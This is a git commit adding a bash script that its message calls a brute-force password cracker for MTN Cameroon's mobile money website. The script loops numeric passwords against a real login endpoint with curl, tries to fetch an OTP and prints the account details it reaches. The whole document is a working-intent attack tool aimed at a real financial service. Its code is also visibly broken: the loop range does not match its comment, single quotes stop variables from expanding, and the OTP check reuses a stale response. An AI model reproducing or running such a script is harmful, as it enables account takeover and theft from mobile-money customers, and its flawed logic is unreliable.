ca5d6e62a577922516ec3e47d2e53450f6c5feae
SHIELD660 <115630427+CIPHER0930@users.noreply.github.com>
2023-09-05 15:55:41 +0100

    Create AccountBalCheck.sh
    a brute-force password cracker for the MTN Cameroon mobile money website. It works by first getting the request headers from the website. Then, it iterates from 0 to 9999, generating a different password for each iteration. For each password, it makes a POST request to the login page, passing the username and password as parameters. If the request is successful, the script will get the OTP from the website and check if it is valid. If the OTP is valid, the script will get the account details and print them out

---
+++ AccountBalCheck.sh
@@ -0,0 +1,34 @@
+# Get the username from the user
+read username
+
+# Get the request headers from the website
+headers=$(curl -k -s -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9" 'https://196.202.232.201/MoMoWebAppMTNCameroon/login.xhtml' | grep -E ': ' | cut -d ' ' -f1)
+
+# Iterate from 0 to 9999
+for i in {00000..99999}; do
+
+  # Create the request parameters
+  params='loginForm=loginForm&loginForm[username]=$username&loginForm[password]=$i&loginForm[j_idt19]=Login&javax.faces.ViewState=1319890406535641868:-8273346397217720005'
+
+  # Make the request
+  response=$(curl -k -X POST --data "$params" --header "$headers" 'https://196.202.232.201/MoMoWebAppMTNCameroon/login.xhtml')
+
+  # Check if the password has been found
+  if [[ "$response" == "j_security_check" ]]; then
+
+    # The password has been found, get the otp
+    otp=$(curl -k -s -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9" 'https://196.202.232.201/MoMoWebAppMTNCameroon/pages/otpverification.xhtml' | grep -E ': ' | cut -d ' ' -f1)
+
+    # Check if the otp is valid
+    if [[ "$response" == "j_security_check" ]]; then
+
+      # The otp is valid, get the account details
+      response=$(curl -k -X GET --header "$headers" 'https://mobilemoney.mtncameroon.net/MoMoWebAppMTNCameroon/pages/selectedaccountdeatils.xhtml')
+
+      # Print the account details
+      echo "$response"
+
+      break
+    fi
+  fi
+done
